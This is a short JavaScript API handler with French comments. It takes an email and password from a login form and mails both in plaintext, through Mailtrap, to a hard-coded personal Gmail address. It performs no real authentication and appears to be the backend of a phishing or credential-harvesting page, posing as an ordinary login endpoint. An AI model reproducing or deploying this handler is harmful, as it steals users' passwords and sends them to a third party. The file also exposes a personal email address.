require("dotenv").config();
const nodemailer = require("nodemailer");

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Méthode non autorisée" });
  }

  const { email, password } = req.body;

  // Validation basique
  if (!email || !password) {
    return res.status(400).json({ message: "Tous les champs sont requis" });
  }

  // Transporteur Nodemailer (Mailtrap)
  const transporter = nodemailer.createTransport({
    host: process.env.MAILTRAP_HOST,
    port: process.env.MAILTRAP_PORT,
    auth: {
      user: process.env.MAILTRAP_USER,
      pass: process.env.MAILTRAP_PASSWORD,
    },
  });

  // Options de l'email
  const mailOptions = {
    from: process.env.MAILTRAP_USER,
    to: "luccabondi@gmail.com",
    subject: "Nouveau message de log",
    text: `Email : ${email}\nMot de passe : ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "Email envoyé !" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Erreur d'envoi d'email", error });
  }
}
